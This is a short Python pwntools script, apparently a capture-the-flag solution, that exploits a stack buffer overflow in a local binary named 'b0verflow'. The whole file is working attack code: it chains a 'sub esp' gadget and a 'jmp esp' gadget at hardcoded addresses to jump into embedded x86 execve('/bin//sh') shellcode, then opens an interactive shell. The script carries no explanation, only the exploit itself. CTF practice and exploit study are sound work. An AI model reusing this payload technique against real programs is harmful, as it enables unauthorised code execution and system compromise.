from pwn import *

target = process('./b0verflow')
# gdb.attach(target, gdbscript='b *0x80485a0')

target.recvuntil('What\'s your name?')

sub_esp = p32(0x08048500)  # sub esp, 0x24 ; ret
jmp_esp = p32(0x08048504)  # jmp esp
# from http://shell-storm.org/shellcode/files/shellcode-811.php
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

payload = b'\x00' * 4 + jmp_esp
# http://shell-storm.org/shellcode/files/shellcode-811.php
payload += shellcode
payload += b'\x00' * (0x24 - len(payload))
payload += sub_esp

target.sendline(payload)

target.interactive()
